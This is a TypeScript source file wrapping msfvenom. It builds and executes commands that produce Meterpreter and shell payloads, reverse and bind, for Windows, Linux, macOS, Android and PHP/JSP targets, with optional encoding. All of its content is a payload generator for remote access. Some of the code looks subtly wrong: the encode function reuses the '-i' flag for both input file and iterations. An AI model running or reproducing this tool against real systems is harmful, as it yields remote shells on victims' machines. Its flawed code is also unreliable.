import { executeCommand, sanitizeInput, formatOutput } from '../utils.js';

/**
 * Interface for MSFVenom payload generation options
 */
export interface MSFVenomPayloadOptions {
  payloadType: string;
  platform: string;
  format: string;
  ip?: string;
  port?: number;
  encoder?: string;
  iterations?: number;
  options?: Record<string, string>;
}

/**
 * Interface for MSFVenom payload encoding options
 */
export interface MSFVenomEncodingOptions {
  payloadFile: string;
  encoder: string;
  iterations?: number;
  outputFormat?: string;
}

/**
 * MSFVenom tool implementation for payload generation
 */
export class MSFVenomTool {
  /**
   * Generate a payload using MSFVenom
   * @param options Payload generation options
   * @returns Generated payload information
   */
  async generatePayload(options: MSFVenomPayloadOptions): Promise<string> {
    // Sanitize inputs
    const payloadType = sanitizeInput(options.payloadType);
    const platform = sanitizeInput(options.platform);
    const format = sanitizeInput(options.format);
    const ip = options.ip ? sanitizeInput(options.ip) : '';
    const port = options.port || 4444;
    const encoder = options.encoder ? sanitizeInput(options.encoder) : '';
    const iterations = options.iterations || 1;
    
    // Build the payload string based on platform and type
    let payload = '';
    
    // Common payload types by platform
    if (platform === 'windows') {
      switch (payloadType) {
        case 'reverse_tcp': payload = 'windows/meterpreter/reverse_tcp'; break;
        case 'reverse_https': payload = 'windows/meterpreter/reverse_https'; break;
        case 'bind_tcp': payload = 'windows/meterpreter/bind_tcp'; break;
        default: payload = 'windows/meterpreter/reverse_tcp';
      }
    } else if (platform === 'linux') {
      switch (payloadType) {
        case 'reverse_tcp': payload = 'linux/x86/meterpreter/reverse_tcp'; break;
        case 'reverse_https': payload = 'linux/x86/meterpreter/reverse_https'; break;
        case 'bind_tcp': payload = 'linux/x86/meterpreter/bind_tcp'; break;
        default: payload = 'linux/x86/meterpreter/reverse_tcp';
      }
    } else if (platform === 'mac') {
      switch (payloadType) {
        case 'reverse_tcp': payload = 'osx/x86/shell_reverse_tcp'; break;
        case 'bind_tcp': payload = 'osx/x86/shell_bind_tcp'; break;
        default: payload = 'osx/x86/shell_reverse_tcp';
      }
    } else if (platform === 'android') {
      switch (payloadType) {
        case 'reverse_tcp': payload = 'android/meterpreter/reverse_tcp'; break;
        case 'reverse_https': payload = 'android/meterpreter/reverse_https'; break;
        default: payload = 'android/meterpreter/reverse_tcp';
      }
    } else if (platform === 'web') {
      switch (payloadType) {
        case 'jsp': payload = 'java/jsp_shell_reverse_tcp'; break;
        case 'php': payload = 'php/meterpreter/reverse_tcp'; break;
        case 'asp': payload = 'windows/meterpreter/reverse_tcp'; break;
        default: payload = 'php/meterpreter/reverse_tcp';
      }
    } else {
      // Default to windows reverse_tcp if platform is unknown
      payload = 'windows/meterpreter/reverse_tcp';
    }
    
    // Build the command
    let command = `msfvenom -p ${payload}`;
    
    // Add LHOST and LPORT if it's a reverse payload
    if (payload.includes('reverse') && ip) {
      command += ` LHOST=${ip} LPORT=${port}`;
    } else if (payload.includes('bind')) {
      command += ` RPORT=${port}`;
    }
    
    // Add format
    command += ` -f ${format}`;
    
    // Add encoder if specified
    if (encoder) {
      command += ` -e ${encoder} -i ${iterations}`;
    }
    
    // Add any additional options
    if (options.options) {
      for (const [key, value] of Object.entries(options.options)) {
        command += ` ${sanitizeInput(key)}=${sanitizeInput(value)}`;
      }
    }
    
    // Execute the command
    const { stdout, stderr } = await executeCommand(command);
    
    if (stderr && !stdout) {
      return `Error: ${stderr}`;
    }
    
    return formatOutput(stdout);
  }

  /**
   * Encode an existing payload
   * @param options Payload encoding options
   * @returns Encoded payload information
   */
  async encodePayload(options: MSFVenomEncodingOptions): Promise<string> {
    // Sanitize inputs
    const payloadFile = sanitizeInput(options.payloadFile);
    const encoder = sanitizeInput(options.encoder);
    const iterations = options.iterations || 1;
    const outputFormat = sanitizeInput(options.outputFormat || 'raw');
    
    // Build the command
    const command = `msfvenom -i ${payloadFile} -e ${encoder} -i ${iterations} -f ${outputFormat}`;
    
    // Execute the command
    const { stdout, stderr } = await executeCommand(command);
    
    if (stderr && !stdout) {
      return `Error: ${stderr}`;
    }
    
    return formatOutput(stdout);
  }
}
